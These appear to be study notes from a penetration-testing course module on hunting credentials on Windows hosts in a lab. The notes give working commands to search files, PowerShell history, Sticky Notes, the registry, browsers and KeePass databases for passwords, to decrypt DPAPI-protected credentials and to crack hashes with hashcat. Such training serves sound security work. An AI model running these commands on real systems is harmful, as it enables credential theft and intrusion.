## Application Configuration Files
```powershell-session
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
#### Chrome Dictionary Files

Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.

```powershell-session
> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' 
```
## Unattended Installation Files
Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.
```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">

            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
```
## PowerShell History File

Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:

```
C:\Users<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

seen in the (handy) Windows Commands PDF, published by Microsoft [here](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf), there are many commands which can pass credentials on the command line. We can see in the example below that the user-specified local administrative credentials to query the Application Event Log using [wevutil](https://ss64.com/nt/wevtutil.html).

`GET HISTORY FILE LOCATION`
```powershell
> (Get-PSReadLineOption).HistorySavePath
```
#### Reading PowerShell History File

```powershell-session
> gc (Get-PSReadLineOption).HistorySavePath
```

We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user. This can also be extremely helpful as a post-exploitation step. We should always recheck these files once we have local admin if our prior access did not allow us to read the files for some users. This command assumes that the default save path is being used.
```powershell-session
PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
## PowerShell Credentials
The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API),  data protection api, 
which typically means they can only be decrypted by the same user on the same computer they were created on
.**Encryption with DPAPI:**

- The password is **encrypted with Windows DPAPI**, meaning:
    
    - It is tied to the **user account** or **machine context**.
        
    - Only the same user on the same machine can decrypt the password.
        
- **Advantage**: Even if someone steals the exported XML file, they cannot decrypt the password on a different machine or with a different user account.

Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

#### Decrypting PowerShell Credentials

If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.

Credential Hunting

```powershell-session
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

# ADITIONAL FILE FORMATS

additional information that can be used to escalate privileges. In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as `.kdbx`, `.vmdk`, `.vdhx`, `.ppk`, etc. We may find a virtual hard drive that we can mount and extract local administrator password hashes from, an SSH private key that can be used to access other systems, or instances of users storing passwords in Excel/Word Documents, OneNote workbooks, or even the classic `passwords.txt`
```cmd-session
C:\htb> findstr /spin "password" *.*
```
![](Pasted%20image%2020250325113309.png)
#### Search for File Extensions - Example 1

```cmd-session
> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

c:\inetpub\wwwroot\web.config
```

### searching for extensions

```cmd-session
C:\htb> where /R C:\ *.config

c:\inetpub\wwwroot\web.config
```


```powershell-session
PS C:\htb> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

## Sticky Notes Passwords

People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.


```powershell-session
PS C:\htb> ls
 
 
    Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal
```

We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

![DB Browser for SQLite showing a query 'select Text from Note;' with results. Two entries: one with ID ending in 'c2' and text 'vCenter', another with ID ending in '290' and text 'blah blah blah'.](https://academy.hackthebox.com/storage/modules/67/stickynote.png)

#### Viewing Sticky Notes Data Using PowerShell

This can also be done with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite). First, import the module, point to a data source (in this case, the SQLite database file used by the StickNotes app), and finally query the `Note` table and look for any interesting data. This can also be done from our attack machine after downloading the `.sqlite` file or remotely via WinRM.

```powershell-session
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
```

```powershell-session
PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
```

#### Strings to View DB File Contents

We can also copy them over to our attack box and search through the data using the `strings` command, which may be less efficient depending on the size of the database.

```shell-session
 strings plum.sqlite-wal
```

```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```
Some of the privilege escalation enumeration scripts listed earlier in this module search for most, if not all, of the files/extensions mentioned in this section. Nevertheless, we must understand how to search for these manually and not only rely on tools.

# Further Credential theft

`list stored credentials`
```cmd-session
 cmdkey /list

 Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
	
```


When we attempt to RDP to the host, the saved credentials will be used.

![Remote Desktop Connection window showing Computer: SQL01 and User name: inlanefreight\bob. Options to edit or delete saved credentials. Connect and Help buttons visible.](https://academy.hackthebox.com/storage/modules/67/cmdkey_rdp.png)

We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:

#### Run Commands as Another User

```powershell-session
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

---
#### Retrieving Saved Credentials from Chrome

Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```powershell-session
PS C:\htb> .\SharpChrome.exe logins /unprotect

--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

```
Note: Credential collection from Chromium-based browsers generates additional events that could be logged and identified as `4983`, `4688`, and `16385`, and monitored by the blue team.
### password managers
Some password managers such as `KeePass` are stored locally on the host. If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password. If we can download a `.kdbx` file to our attacking host, we can use a tool such as [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) to extract the password hash and run it through a password cracking tool such as [Hashcat](https://github.com/hashcat) or [John the Ripper](https://github.com/openwall/john).

#### Extracting KeePass Hash

First, we extract the hash in Hashcat format using the `keepass2john.py` script.

Further Credential Theft

```shell-session
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```

#### Cracking Hash Offline
We can then feed the hash to Hashcat, specifying [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 for KeePass. If successful, we may gain access to a wealth of credentials that can be used to access other applications/systems or even network devices, servers, databases, etc., if we can gain access to a password database used by IT staff.


```shell-session
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```
## Email

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

---

## More Fun with Credentials

When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., OpenVPN). The output can be saved to a standard text file or in JSON format. Let's take it for a spin.

#### Viewing LaZagne Help Menu

We can view the help menu with the `-h` flag.

Further Credential Theft

![](Pasted%20image%2020250325234714.png)We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely. It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files

#### Running SessionGopher as Current User

We need local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.

Further Credential Theft

```powershell-session
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
```
## Clear-Text Password Storage in the Registry

Certain programs and windows configurations can result in clear-text passwords or other data being stored in the registry. While tools such as `Lazagne` and `SessionGopher` are a great way to extract credentials, as penetration testers we should also be familiar and comfortable with enumerating them manually.

### Windows AutoLogon

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup. However, once this is configured, the username and password are stored in the registry, in clear-text. This feature is commonly used on single-user systems or in situations where convenience outweighs the need for enhanced security.

The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:

Code: cmd

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

The typical configuration of an Autologon account involves the manual setting of the following registry keys:

- `AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
- `DefaultUserName` - Holds the value of the username of the account that will automatically log on.
- `DefaultPassword` - Holds the value of the password for the user account specified previously.

#### Enumerating Autologon with reg.exe

Further Credential Theft

```cmd-session
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

**`Note:`** If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.

### Putty

For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.

Code: cmd

```cmd
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

Note that the access controls for this specific registry key are tied to the user account that configured and saved the session. Therefore, in order to see it, we would need to be logged in as that user and search the `HKEY_CURRENT_USER` hive. Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in `HKEY_USERS`.

#### Enumerating Sessions and Finding Credentials:

First, we need to enumerate the available saved sessions:

Further Credential Theft

```powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

Next, we look at the keys and values of the discovered session "`kali%20ssh`":

Further Credential Theft

```powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!    
```

In this example, we can imagine the scenario that the IT administrator has configured Putty for a user in their environment, but unfortunately used their admin credentials in the proxy connection. The password could be extracted and potentially reused across the network.

For additional information on `reg.exe` and working with the registry, be sure to check out the [Introduction to Windows Command Line](https://academy.hackthebox.com/module/167/section/1623) module.

## Wifi Passwords

#### Viewing Saved Wireless Networks

If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.

Further Credential Theft

```cmd-session
C:\htb> netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)

    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp
```

#### Retrieving Saved Wireless Passwords

Depending on the network configuration, we can retrieve the pre-shared key (`Key Content` below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources.
